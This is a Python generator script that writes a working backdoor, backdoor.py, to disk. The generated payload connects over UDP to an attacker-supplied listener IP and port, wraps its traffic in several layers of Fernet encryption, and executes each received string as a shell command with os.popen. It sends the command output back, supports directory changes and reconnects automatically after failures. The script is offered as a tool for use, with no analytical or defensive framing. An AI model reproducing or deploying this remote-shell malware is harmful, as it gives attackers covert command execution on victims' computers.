import shutil
import os
import sys
if len(sys.argv) < 2:
  print("Usage: <program> <listener ip> <listener port>")
  sys.exit(1)
ip = sys.argv[1]
port = sys.argv[2]
keys = []
if not os.path.isfile("keys"):
     print("Keys file not found. Please generate one with \"key_generator.py\"")
     sys.exit(1)
for key in open("keys").readlines():
   keys.append(bytes(key.strip(), 'utf-8'))
keys.reverse()
keys2 = keys
keys2.reverse()

keys = str(keys)


full = f"""
import os
import sys
import time
import socket

lib = os.__file__
if "C:" in str(lib):
 if os.path.isdir("cryptography"):
    print("windows" + lib)
    loca = lib.find("os.py")
    print("copy cryptography " + lib[0:loca])
    os.system("copy cryptography " + lib[0:loca])
    os.system("rmdir /s /Q cryptography")
else:
    print("linux" + lib)
    os.system("pip install cryptography")
    os.system("rm -rf cryptography")


from cryptography.fernet import Fernet

keys = {keys}
keys2 = {keys2}
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
serv = ('{ip}', {port})

payload = bytes("HEARTBEAT", "utf-8")
s.connect(serv)
reset = False
cds = []
while True:
 while not reset:
  while True:
   try:
    for key in keys:
       key2 = key.decode()
       key = Fernet(key)
       payload  = key.encrypt(payload)
    s.settimeout(30)
    s.sendto(payload, serv)
    data = s.recvfrom(99999999)[0]
    for key in keys2:
       key2 = key.decode()
       key = Fernet(key)
       data = key.decrypt(data)
    print(data)
    if "SERVER RESET#--__--__2222" in data.decode():
           print("RESET")
           s.close()
           reset = True
    data = data.decode()
    payload = os.popen(data).read()
    payload = bytes(payload, "utf-8")
    if data[0:2] == "cd":
          cd_to = data.split("cd")[1].strip()
          print(cd_to)
          os.chdir(cd_to)
          payload = b"FROM BACKDOOR:Directory Changed!"
   except Exception as a:
    print(a)
    print("Reconnecting")
    data = ""
    payload = b"FROM BACKDOOR: RECONNECT"
    time.sleep(5)
    s.close()
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    serv = ('{ip}', {port})
    s.connect(serv)
 print("SERVER END RESET")
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 serv = ('{ip}', {port})
 s.connect(serv)

"""
if not os.path.isdir("backdoor"):
 os.mkdir("backdoor")
os.system("cp -r cryptography backdoor")
open("backdoor/backdoor.py", "w").write(full)
print("BACKDOOR GENERATED SUCCESSFULLY")
